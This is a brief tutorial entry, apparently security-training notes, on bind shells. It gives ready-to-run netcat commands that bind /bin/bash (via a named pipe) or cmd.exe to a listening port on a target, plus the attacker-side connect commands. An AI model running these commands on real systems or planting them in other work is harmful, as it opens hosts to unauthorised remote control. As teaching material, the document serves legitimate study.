A **bind shell** is a type of shell where the **target machine opens a listening port** and binds a **command-line interface (CLI)** to it.  
The attacker then connects to that open port to gain shell access.

- In a bind shell, **the attacker initiates the connection**.  
- This is different from a reverse shell, where the target connects back to the attacker.

> ⚠️ Note: Bind shells may fail if the target is behind a firewall or NAT that blocks incoming connections.

---

## Linux Bind Shell 

### Target Machine

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_machine_ip> <port> > /tmp/f
```

This works by:

- Creating a named pipe
    
- Redirecting shell input/output through Netcat
    
- Binding `/bin/bash` to the listening port
    

### Attacker Machine

```bash
nc -nv <target_machine_ip> <port>
```

---

## Windows Bind Shell with Netcat

⚠️ Netcat is **not installed by default on Windows**, so the executable must first be transferred to the target system.

### Target Machine

```cmd
nc.exe -lvp <BIND_PORT> -e cmd.exe
```

### Attacker Machine

```bash
nc <TARGET_IP> <BIND_PORT>
```

Once connected, the attacker receives a **Windows command prompt**.
